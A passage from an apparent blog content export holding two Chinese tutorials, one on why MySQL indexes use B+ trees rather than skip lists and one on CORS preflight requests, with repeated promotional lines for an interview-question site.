title=\"两层跳表查询\"></a>两层跳表查询</h3><p>如查询id&#x3D;11的数据，我们先在上层遍历，依次判断1,6,12，</p>\n<p>很快就可以判断出11在6到12之间，</p>\n<p>第二步，然后往下一跳，进入原始链表，就可以在遍历6,7,8,9,10,11之后，确定id&#x3D;11的位置。</p>\n<p>通过第一级索引，直接将查询范围从原来的1到11，缩小到现在的1,6,7,8,9,10,11。</p>\n<h3 id=\"三层跳表\"><a href=\"#三层跳表\" class=\"headerlink\" title=\"三层跳表\"></a>三层跳表</h3><p>三层跳表 &#x3D; 原始链表 + 第一层索引 + 第二层索引</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/5.png\"></p>\n<h3 id=\"三层跳表查询\"><a href=\"#三层跳表查询\" class=\"headerlink\" title=\"三层跳表查询\"></a>三层跳表查询</h3><p>如果还是查询id&#x3D;11的数据，就只需要查询1,6,9,10,11就能找到，比两层的时候更快一些。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/6.png\"></p>\n<h3 id=\"跳表查找的时间复杂度\"><a href=\"#跳表查找的时间复杂度\" class=\"headerlink\" title=\"跳表查找的时间复杂度\"></a>跳表查找的时间复杂度</h3><p>在一个单链表中查询某个数据的时间复杂度是 O(n)。也就是说，单层的跳表， 时间复杂度是 O(n)。</p>\n<p>跳表 就是 为链表 增加多级索引， 完成空间换时间， 实现 时间复杂度是 O(logn)。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/7.png\"><br>这个时间复杂度的分析方法比较难想到。</p>\n<p>先问题分解一下，先来看这样一个问题，如果链表里有 n 个结点，会有多少级索引呢？</p>\n<p>在跳表中，假设每两个结点，会抽出一个结点作为上一级索引的结点。</p>\n<p>那么，索引有多少级，每一级有多少个node呢：</p>\n<ul>\n<li><p>第一级索引的结点个数大约就是 n&#x2F;2，</p>\n</li>\n<li><p>第二级索引的结点个数大约就是 n&#x2F;4，</p>\n</li>\n<li><p>第三级索引的结点个数大约就是 n&#x2F;8，</p>\n</li>\n</ul>\n<p>依次类推，也就是说，</p>\n<ul>\n<li><p>第 k 级索引的结点个数是第 k-1 级索引的结点个数的 1&#x2F;2，</p>\n</li>\n<li><p>那第 k级索引结点的个数就是 n&#x2F;(2的k次方)。</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/8.png\"><br>假设索引有 h 级，最高级的索引有 2 个结点。</p>\n<p>通过上面的公式，我们可以得到 n&#x2F;(2^h)&#x3D;2，从而求得 h&#x3D;log2n-1。</p>\n<p>如果包含原始链表这一层，整个跳表的高度就是 log2n。</p>\n<p>我们在跳表中查询某个数据的时候，如果每一层都要遍历 m 个结点，那在跳表中查询一个数据的时间复杂度就是 O(m*logn)。</p>\n<p>那m到底是多少呢?</p>\n<p>假设我们要查找的数据是 x，在第 k 级索引中，我们遍历到 y 结点之后，发现 x 大于 y，小于后面的结点 z，所以我们通过 y 的 down 指针，从第 k 级索引下降到第 k-1 级索引。</p>\n<p>在第 k-1 级索引中，y 和 z 之间只有 3 个结点（包含 y 和 z），所以，我们在 K-1 级索引中最多只需要遍历 3 个结点，依次类推，每一级索引都最多只需要遍历 3 个结点。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/9.png\"><br>过上面的分析，我们得到 m&#x3D;3，</p>\n<p>所以在跳表中查询任意数据的时间复杂度就是 O(logn)。</p>\n<p>这个查找的时间复杂度跟二分查找是一样的，这也体现了空间换时间的效率之高。</p>\n<h3 id=\"跳表-Skip-List-的优点和缺点\"><a href=\"#跳表-Skip-List-的优点和缺点\" class=\"headerlink\" title=\"跳表(Skip List)的优点和缺点\"></a>跳表(Skip List)的优点和缺点</h3><p>跳表是一种多层级的数据结构，每一层都是一个有序链表，</p>\n<p>最底层包含所有数据，而上层包含的数据是下层的子集，通过跳跃节点快速定位目标数据。</p>\n<p><strong>跳表(Skip List)的优点</strong></p>\n<ul>\n<li><p>平均<strong>查找时间较低</strong>：跳表的查询时间复杂度为O(log n)，与平衡树结构相似，但实现起来较为简单。</p>\n</li>\n<li><p>插入和删除操作相对较快：由于跳表不需要进行节点的频繁平衡调整，插入和删除操作的性能较好。</p>\n</li>\n</ul>\n<p><strong>跳表(Skip List)的缺点</strong></p>\n<ul>\n<li><p>难以实现<strong>事务和数据持久性</strong>：跳表的更新操作可能涉及多个层级，实现事务和数据持久性要求更复杂。</p>\n</li>\n<li><p>空间开销较大：跳表需要额外的指针来连接不同层级，占用的内存空间较多。</p>\n</li>\n</ul>\n<h2 id=\"B-Tree-和-跳表-Skip-List-的在数据结构上的区别\"><a href=\"#B-Tree-和-跳表-Skip-List-的在数据结构上的区别\" class=\"headerlink\" title=\"B+Tree 和 跳表(Skip List) 的在数据结构上的区别\"></a>B+Tree 和 跳表(Skip List) 的在数据结构上的区别</h2><p>都是 多级索引 +链表</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/10.png\"></p>\n<h3 id=\"IO-操作的单位-不同\"><a href=\"#IO-操作的单位-不同\" class=\"headerlink\" title=\"IO 操作的单位 不同\"></a>IO 操作的单位 不同</h3><p>B+Tree 是page （16K）</p>\n<p>跳表(Skip List) 是 node 节点 ，一个node 几十个字节</p>\n<h3 id=\"树的高度-不同\"><a href=\"#树的高度-不同\" class=\"headerlink\" title=\"树的高度 不同\"></a>树的高度 不同</h3><p><strong>B+树</strong>是多叉树结构，每个结点都是一个<code>16k</code>的数据页，能存放较多索引信息。</p>\n<p>同样的数据，树的高度比较小。 三层B+左右就可以存储2kw左右的数据。</p>\n<p>如果，把三层B+树塞满，那大概需要2kw左右的数据。 也就是说查询一次数据，如果这些数据页都在磁盘里，那么<strong>最多需要查询三次磁盘IO</strong>。</p>\n<p>跳表是链表结构，一条数据一个结点，</p>\n<p>如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，</p>\n<p>所以，2kw数据的跳表大概高度在24层左右。 如果要一个节点要进行一次磁盘IO，大概要进行 24次。</p>\n<h2 id=\"B-Tree-和-跳表-Skip-List-的新增数据区别\"><a href=\"#B-Tree-和-跳表-Skip-List-的新增数据区别\" class=\"headerlink\" title=\"B+Tree 和 跳表(Skip List) 的新增数据区别\"></a>B+Tree 和 跳表(Skip List) 的新增数据区别</h2><p>了解了二者的基本情况之后，接下来，对B+Tree 和 跳表(Skip List) 的数据插入进行对比。</p>\n<p>B+Tree和跳表的叶子层，都包含了所有的数据，且叶子层都是顺序的，适合用于范围查询。</p>\n<p>来看看，B+Tree和跳表新增和删除数据的差异</p>\n<h3 id=\"B-Tree-新增数据\"><a href=\"#B-Tree-新增数据\" class=\"headerlink\" title=\"B+Tree 新增数据\"></a>B+Tree 新增数据</h3><p><strong>场景1： 叶子结点和索引结点都没满</strong></p>\n<p>B+Tree 直接插入到叶子结点中就好了。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/11.png\"><br><strong>场景2：叶子结点满了，但索引结点没满</strong></p>\n<p>B+Tree 需要拆分叶子结点，同时索引结点要增加新的索引信息。</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/12.png\"><br><strong>场景3：叶子结点满了，且索引结点也满了</strong></p>\n<p>叶子和索引结点都要拆分，同时往上还要再<strong>加一层索引。</strong></p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/13.png\"><br>B+树是一种多叉平衡二叉树，要维护各个分支的高度差距，不能太大，平衡意味着子树们的高度层级尽量一致（一般最多差一个层级）。</p>\n<p>为啥要平衡呢？平衡意味着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。</p>\n<p>所以，为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 <strong>数据页的 分裂</strong>。</p>\n<h3 id=\"跳表新增数据\"><a href=\"#跳表新增数据\" class=\"headerlink\" title=\"跳表新增数据\"></a>跳表新增数据</h3><p>跳表同样也是很多层，新增一个数据时，最底层的链表需要插入数据，</p>\n<p>然后，考虑是否需要在上面几层中加入数据做索引 ？ 这个就靠<strong>随机函数</strong>了。</p>\n<p>例如: 如果跳表中插入数据id&#x3D;6，且随机函数返回第三层（有25%的概率），那就需要在跳表的最底层到第三层都插入数据。</p>\n<p>跳表跟B+树不一样，跳表是否新增层数，纯粹靠随机函数，不太关心平衡的问题。</p>\n<h2 id=\"B-Tree和跳表的在新增数据上的区别\"><a href=\"#B-Tree和跳表的在新增数据上的区别\" class=\"headerlink\" title=\"B+Tree和跳表的在新增数据上的区别\"></a>B+Tree和跳表的在新增数据上的区别</h2><h4 id=\"B-Tree-需要维护-树的平衡\"><a href=\"#B-Tree-需要维护-树的平衡\" class=\"headerlink\" title=\"B+Tree 需要维护 树的平衡\"></a>B+Tree 需要维护 树的平衡</h4><p>为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 <strong>数据页的 分裂</strong>。</p>\n<p>维护平衡意味维护搜索的稳定性， 意味着着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。</p>\n<h4 id=\"跳表-需要不太关心平衡问题\"><a href=\"#跳表-需要不太关心平衡问题\" class=\"headerlink\" title=\"跳表 需要不太关心平衡问题\"></a>跳表 需要不太关心平衡问题</h4><p>跳表在新增数据 时，不太关心平衡的问题。跳表插入数据的时候，跟B+树不一样，是否新增层数，纯粹靠随机函数去决定。</p>\n<h2 id=\"为什么B-Tree-采用Page作为-IO操作的单位？\"><a href=\"#为什么B-Tree-采用Page作为-IO操作的单位？\" class=\"headerlink\" title=\"为什么B+Tree 采用Page作为 IO操作的单位？\"></a>为什么B+Tree 采用Page作为 IO操作的单位？</h2><p>前面讲到，B+Tree和跳表 IO 操作的单位 不同</p>\n<ul>\n<li><p>B+Tree 是page （16K） ,粗粒度IO</p>\n</li>\n<li><p>跳表(Skip List) 是 node 节点 ，一个node 几十个字节 , 细粒度IO</p>\n</li>\n</ul>\n<p>这是和 Mysql的存储介质有关系， Mysql的数据需要持久化存储， 并且需要事务机制保证持久性，所以，必须存储在磁盘上。</p>\n<h3 id=\"内存和磁盘的访问速度对比\"><a href=\"#内存和磁盘的访问速度对比\" class=\"headerlink\" title=\"内存和磁盘的访问速度对比\"></a>内存和磁盘的访问速度对比</h3><p>机械硬盘的读写速度，大致如下</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/14.png\"><br>固态硬盘的读写速度，大致如下</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/15.png\"><br>内存的读写速度，和磁盘读写速度的对比</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/16.png\"><br>为什么磁盘慢，和磁盘的结构有关。</p>\n<h3 id=\"机械硬盘的扇区（sector）\"><a href=\"#机械硬盘的扇区（sector）\" class=\"headerlink\" title=\"机械硬盘的扇区（sector）\"></a>机械硬盘的扇区（sector）</h3><p>机械硬盘的性能为啥那么慢？ 看看结构就知道：</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/17.png\"><br>机械磁盘上的每个磁道被等分为若干个弧段，这些弧段称之为扇区。</p>\n<p>如何在磁盘中读&#x2F;写数据？ 需要 物理动作，去移动 “磁头” 到目标 扇区</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/18.png\"><br>机械磁盘的读写以扇区为基本单位。</p>\n<p>硬盘的物理读写以扇区为基本单位。通常情况下每个扇区的大小是 512 字节。linux 下可以使用 <code>fdisk -l</code> 了解扇区大小：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo /sbin/fdisk -l  </span><br><span class=\"line\">Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors  </span><br><span class=\"line\">Units: sectors of 1 * 512 = 512 bytes  </span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes  </span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes  </span><br><span class=\"line\">Disklabel type: dos  </span><br><span class=\"line\">Disk identifier: 0x7d9f5643  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中 Sector size，就是扇区大小，本例中为 512 bytes。</p>\n<p>注意，扇区是磁盘物理层面的概念，不是操作系统的概率。</p>\n<p>操作系统是不直接与扇区交互的，而是与多个连续扇区组成的磁盘块交互。由于扇区是物理层面的概念，所以无法在系统中进行大小的更改。</p>\n<h3 id=\"操作系统-IO-块-Block\"><a href=\"#操作系统-IO-块-Block\" class=\"headerlink\" title=\"操作系统 IO 块 Block\"></a>操作系统 IO 块 Block</h3><p>文件系统读写数据的最小单位，也叫磁盘簇，IO区块 BLOC。</p>\n<p>什么是IO 块 Block？ 扇区是磁盘最小的物理存储单元，操作系统将相邻的扇区组合在一起，形成一个块，对块进行管理。</p>\n<p>每个Block 磁盘块可以包括 2、4、8、16、32 或 64 个扇区。</p>\n<p>所以，Block 磁盘块是操作系统所使用的逻辑概念，而非磁盘的物理概念。</p>\n<p>Block 磁盘块的大小可以通过命令 <code>stat /boot</code> 来查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo stat /boot  </span><br><span class=\"line\">  File: /boot  </span><br><span class=\"line\">  Size: 4096        Blocks: 8          IO Block: 4096   directory  </span><br><span class=\"line\">Device: 801h/2049d  Inode: 655361      Links: 3  </span><br><span class=\"line\">Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)  </span><br><span class=\"line\">Access: 2019-07-06 20:19:45.487160301 +0800  </span><br><span class=\"line\">Modify: 2019-07-06 20:19:44.835160301 +0800  </span><br><span class=\"line\">Change: 2019-07-06 20:19:44.835160301 +0800  </span><br><span class=\"line\"> Birth: -  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中 IO Block 就是磁盘块大小，本例中是 4096 Bytes，一般也是 4K。</p>\n<h3 id=\"Mysql的InnoDB-Page-数据页\"><a href=\"#Mysql的InnoDB-Page-数据页\" class=\"headerlink\" title=\"Mysql的InnoDB Page 数据页\"></a>Mysql的InnoDB Page 数据页</h3><p>磁盘IO是低性能的，如何提升性能， 最好是 减少IO， 基于时间局部性和空间局部性原理， 一次读取足够多的数据到内存。</p>\n<p>Mysql的 InnoDB将数据划分为若干页，以Page 页作为磁盘与内存交互的基本单位，一般页的大小为16KB。</p>\n<p>InnoDB，为了通过减少内存与磁盘的交互次数，把一次读取和写入的 数据量， 从4K 扩大到了16K，也就是一次操作 4个 OS Block，从而提升性能。</p>\n<p>这样的话，一次性至少读取1Page 页数据到内存中或者将1 Page页数据写入磁盘。而不是一个操作系统的block。</p>\n<p>Page 本质上就是一种典型的缓存设计思想，一般缓存的设计基本都是从时间局部性和空间局部性进行考量的：</p>\n<ul>\n<li><p>时间局部性：如果一条数据正在在被使用，那么在接下来一段时间内大概率还会再被使用。可以认为热点数据缓存都属于这种思路的实现。</p>\n</li>\n<li><p>空间局部性：如果一条数据正在在被使用，那么存储在它附近的数据大概率也会很快被使用。InnoDB的数据页和操作系统的页缓存则是这种思路的体现。</p>\n</li>\n</ul>\n<p>InnoDB Page 数据页的结构</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/19.png\"><br>一开始生成页的时候，并没有User Records这个部分.</p>\n<p>每当我们插⼊⼀条记录，都会从Free Space部分，也就是尚未使⽤的存储空间中申请⼀个记录⼤⼩的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使⽤完了，如果还有新的记录插⼊的话，就需要去申请新的页了。</p>\n<h3 id=\"一次IO一个page的优势\"><a href=\"#一次IO一个page的优势\" class=\"headerlink\" title=\"一次IO一个page的优势\"></a>一次IO一个page的优势</h3><p>MySQL的InnoDB存储引擎使用B+树而不是跳表，这是因为B+树一次IO一个page，大大节省了磁盘IO的操作。</p>\n<p>如果使用跳表，那么一个node节点一次io， 存储的性能 估计要下降1000倍以上。</p>\n<h2 id=\"总结：Mysql的索引为什么使用B-树而不使用跳表\"><a href=\"#总结：Mysql的索引为什么使用B-树而不使用跳表\" class=\"headerlink\" title=\"总结：Mysql的索引为什么使用B+树而不使用跳表\"></a>总结：Mysql的索引为什么使用B+树而不使用跳表</h2><h3 id=\"B-树更适合磁盘IO\"><a href=\"#B-树更适合磁盘IO\" class=\"headerlink\" title=\"B+树更适合磁盘IO\"></a>B+树更适合磁盘IO</h3><p><strong>B+Tree</strong>一个节点是一个page，是一种多叉树结构，每个结点都是一个16k的数据页，能存放较多索引信息。一次IO一个page，大大节省了磁盘IO的操作。</p>\n<p><strong>B+Tree</strong>一个page 能存放较多索引信息 ，所以树的层数比较低， <strong>三层</strong>左右就可以存储<code>2kw</code>左右的数据也就是说查询一次数据，如果这些数据页都在磁盘里，那么最多需要查询<strong>三次磁盘IO</strong>。</p>\n<h3 id=\"原生跳表不适合磁盘IO\"><a href=\"#原生跳表不适合磁盘IO\" class=\"headerlink\" title=\"原生跳表不适合磁盘IO\"></a>原生跳表不适合磁盘IO</h3><p><strong>跳表</strong>是链表结构，一条数据一个结点，那么一个node节点一次磁盘io， 一个page 页规模的IO存储的性能 估计要下降1000倍以上。</p>\n<p>原生跳表 一个node存放一个 索引信息 ，所以树的层数比较高</p>\n<p>如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，</p>\n<p>所以，2kw数据的跳表大概高度在24层左右。 如果要进行查找，大概要进行 24次磁盘IO。</p>\n<blockquote>\n<p>这里讲的是原生跳表， 如果经过各种改进，那个不在此文讨论范围。</p>\n</blockquote>\n<p>所以，虽然在理论上，跳表的时间复杂度和B+树相同 ，但是：</p>\n<ul>\n<li><p>B+树更适合 磁盘IO， 更合适MYSQL。</p>\n</li>\n<li><p>从反面来说， 跳表更适合内存IO， 更适合redis。</p>\n</li>\n</ul>\n"},{"title":"POST为什么会发送两次请求","date":"2024-06-16T14:22:31.000Z","_content":"\n\n#### 本文目录\n\n*   同源策略\n\n*   什么是同源策略\n\n*   CORS\n\n*   简单请求\n\n*   预检请求\n\n*   附带身份凭证的请求与通配符\n\n*   完整的请求流程图\n\n*   总结\n\n\n前言\n--\n\n> 最近博主在**字节面试**中遇到这样一个面试题，这个问题也是前端面试的高频问题，因为在前端开发的日常开发中我们总是会与post请求打交道，一个小小的post请求也是牵扯到很多知识点的，博主在这给大家细细道来。\n\n同源策略\n----\n\n在浏览器中，内容是很开放的，任何资源都可以接入其中，如 JavaScript 文件、图片、音频、视频等资源，甚至可以下载其他站点的可执行文件。\n\n但也不是说浏览器就是完全自由的，如果不加以控制，就会出现一些不可控的局面，例如会出现一些安全问题，如：\n\n*   跨站脚本攻击（XSS）\n\n*   SQL 注入攻击\n\n*   OS 命令注入攻击\n\n*   HTTP 首部注入攻击\n\n*   跨站点请求伪造（CSRF）\n\n*   等等…\n\n\n如果这些都没有限制的话，对于我们用户而言，是相对危险的，因此需要一些安全策略来保障我们的隐私和数据安全。\n\n这就引出了最基础、最核心的安全策略：同源策略。\n\n### 什么是同源策略\n\n同源策略是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本如何能与另一个源的资源进行交互。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n如果两个 URL 的协议、主机和端口都相同，我们就称这两个 URL 同源。\n\n**协议：**协议是定义了数据如何在计算机内和之间进行交换的规则的系统，例如 HTTP、HTTPS。\n\n**主机：**是已连接到一个计算机网络的一台电子计算机或其他设备。网络主机可以向网络上的用户或其他节点提供信息资源、服务和应用。使用 TCP/IP 协议族参与网络的计算机也可称为 IP 主机。\n\n**端口：**主机是计算机到计算机之间的通信，那么端口就是进程到进程之间的通信。\n\n如下表给出了与 URL `http://test.home.com:8080/dir/page.html` 的源进行对比的示例：\n\n| URL | 结果 | 原因 |\n| --- | --- | --- |\n| `http://test.home.com:8080/dir/page.html` | 同源 | 只有路径不同 |\n| `http://test.home.com:8080/dir/inner/another.html` | 同源 | 只有路径不同 |\n| `https://test.home.com:8080/secure.html` | 不同源 | 协议不同，HTTP 和 HTTPS |\n| `http://test.home.com:8081/dir/etc.html` | 不同源 | 端口不同 |\n| `http://online.home.com:8080/dir/other.html` | 不同源 | 主机不同 |\n\n同源策略主要表现在以下三个方面：DOM、Web 数据和网络。\n\n**DOM 访问限制：**同源策略限制了网页脚本（如 JavaScript）访问其他源的 DOM。这意味着通过脚本无法直接访问跨源页面的 DOM 元素、属性或方法。这是为了防止恶意网站从其他网站窃取敏感信息。\n\n**Web 数据限制：**同源策略也限制了从其他源加载的 Web 数据（例如 XMLHttpRequest 或 Fetch API）。在同源策略下，XMLHttpRequest 或 Fetch 请求只能发送到与当前网页具有相同源的目标。这有助于防止跨站点请求伪造（CSRF）等攻击。\n\n**网络通信限制：**同源策略还限制了跨源的网络通信。浏览器会阻止从一个源发出的请求获取来自其他源的响应。这样做是为了确保只有受信任的源能够与服务器进行通信，以避免恶意行为。\n\n出于安全原因，浏览器限制从脚本内发起的跨源 HTTP 请求，XMLHttpRequest 和 Fetch API，只能从加载应用程序的同一个域请求 HTTP 资源，除非使用 CORS 头文件\n\nCORS\n----\n\n对于浏览器限制这个词，要着重解释一下：不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。\n\n浏览器将不同域的内容隔离在不同的进程中，网络进程负责下载资源并将其送到渲染进程中，但由于跨域限制，某些资源可能被阻止加载到渲染进程。如果浏览器发现一个跨域响应包含了敏感数据，它可能会阻止脚本访问这些数据，即使网络进程已经获得了这些数据。CORB 的目标是在渲染之前尽早阻止恶意代码获取跨域数据。\n\n> CORB 是一种安全机制，用于防止跨域请求恶意访问跨域响应的数据。渲染进程会在 CORB 机制的约束下，选择性地将哪些资源送入渲染进程供页面使用。\n\n例如，一个网页可能通过 AJAX 请求从另一个域的服务器获取数据。虽然某些情况下这样的请求可能会成功，但如果浏览器检测到请求返回的数据可能包含恶意代码或与同源策略冲突，浏览器可能会阻止网页访问返回的数据，以确保用户的安全。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n跨源资源共享（Cross-Origin Resource Sharing，CORS）是一种机制，允许在受控的条件下，不同源的网页能够请求和共享资源。由于浏览器的同源策略限制了跨域请求，CORS 提供了一种方式来解决在 Web 应用中进行跨域数据交换的问题。\n\nCORS 的基本思想是，服务器在响应中提供一个标头（HTTP 头），指示哪些源被允许访问资源。浏览器在发起跨域请求时会先发送一个预检请求（OPTIONS 请求）到服务器，服务器通过设置适当的 CORS 标头来指定是否允许跨域请求，并指定允许的请求源、方法、标头等信息。\n\n### 简单请求\n\n不会触发 CORS 预检请求。这样的请求为 `简单请求`，。若请求满足所有下述条件，则该请求可视为 `简单请求`：\n\n**1、** HTTP方法限制：只能使用GET、HEAD、POST这三种HTTP方法之一如果请求使用了其他HTTP方法，就不再被视为简单请求；  \n**2、** 自定义标头限制：请求的HTTP标头只能是以下几种常见的标头：`Accept`、`Accept-Language`、`Content-Language`、`Last-Event-ID`、`Content-Type`（仅限于`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`）HTML头部headerfield字段：DPR、Download、Save-Data、Viewport-Width、WIdth如果请求使用了其他标头，同样不再被视为简单请求；  \n**3、** 请求中没有使用ReadableStream对象；  \n**4、** 不使用自定义请求标头：请求不能包含用户自定义的标头；  \n**5、** 请求中的任意XMLHttpRequestUpload对象均没有注册任何事件监听器；XMLHttpRequestUpload对象可以使用XMLHttpRequest.upload属性访问；\n\n### 预检请求\n\n非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为 `预检请求`。\n\n需预检的请求要求必须首先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。`预检请求` 的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。\n\n例如我在自己的网站上删除一条记录:\n\n![](./2024/06/16/POST为什么会发送两次请求/1.png)\n它首先会发起一个预检请求,预检请求的头信息包括两个特殊字段：\n\n*   Access-Control-Request-Method：该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 POST。\n\n*   Access-Control-Request-Headers：该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 content-type,x-secsdk-csrf-token。\n\n*   access-control-allow-origin：在上述例子中，表示 https://xxx.cn 可以请求数据，也可以设置为\\* 符号，表示统一任意跨源请求。\n\n*   access-control-max-age：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 1 天（86408 秒），即允许缓存该条回应 1 天（86408 秒），在此期间，不用发出另一条预检请求。\n\n\n一旦服务器通过了 `预检请求`，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin 头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin 头信息字段。\n\n![](./2024/06/16/POST为什么会发送两次请求/2.png)\n上面头信息中，Access-Control-Allow-Origin 字段是每次回应都必定包含的。\n\n### 附带身份凭证的请求与通配符\n\n在响应附带身份凭证的请求时：\n\n为了避免恶意网站滥用 Access-Control-Allow-Origin 头部字段来获取用户敏感信息，服务器在设置时不能将其值设为通配符 \\*。相反，应该将其设置为特定的域，例如：Access-Control-Allow-Origin: https://xxx.cn。通过将 Access-Control-Allow-Origin 设置为特定的域，服务器只允许来自指定域的请求进行跨域访问。这样可以限制跨域请求的范围，避免不可信的域获取到用户敏感信息。\n\n\n\n为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Headers 的值设为通配符 \\*。这是因为不受限制的请求头可能被滥用。相反，应该将其设置为一个包含标头名称的列表，例如：Access-Control-Allow-Headers: X-PINGOTHER, Content-Type。通过将 Access-Control-Allow-Headers 设置为明确的标头名称列表，服务器可以限制哪些自定义请求头是允许的。只有在允许的标头列表中的头部字段才能在跨域请求中被接受。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Methods 的值设为通配符 \\*。这样做将允许来自任意域的请求使用任意的 HTTP 方法，可能导致滥用行为的发生。相反，应该将其设置为一个特定的请求方法名称列表，例如：Access-Control-Allow-Methods: POST, GET。通过将 Access-Control-Allow-Methods 设置为明确的请求方法列表，服务器可以限制哪些方法是允许的。只有在允许的方法列表中的方法才能在跨域请求中被接受和处理。\n\n\n\n对于附带身份凭证的请求（通常是 Cookie），\n\n这是因为请求的标头中携带了 Cookie 信息，如果 Access-Control-Allow-Origin 的值为 `*`，请求将会失败。而将 Access-Control-Allow-Origin 的值设置为 `https://xxx.cn`，则请求将成功执行。\n\n另外，响应标头中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。\n\n完整的请求流程图\n--------\n\n![](./2024/06/16/POST为什么会发送两次请求/3.png)\n总结\n--\n\n预检请求是在进行跨域资源共享 `CORS` 时，由浏览器自动发起的一种 OPTIONS 请求。它的存在是为了保障安全，并允许服务器决定是否允许跨域请求。\n\n跨域请求是指在浏览器中向不同域名、不同端口或不同协议的资源发送请求。出于安全原因，浏览器默认禁止跨域请求，只允许同源策略。而当网页需要进行跨域请求时，浏览器会自动发送一个预检请求，以确定是否服务器允许实际的跨域请求。\n\n预检请求中包含了一些额外的头部信息，如 Origin 和 Access-Control-Request-Method 等，用于告知服务器实际请求的方法和来源。服务器收到预检请求后，可以根据这些头部信息，进行验证和授权判断。如果服务器认可该跨域请求，将返回一个包含 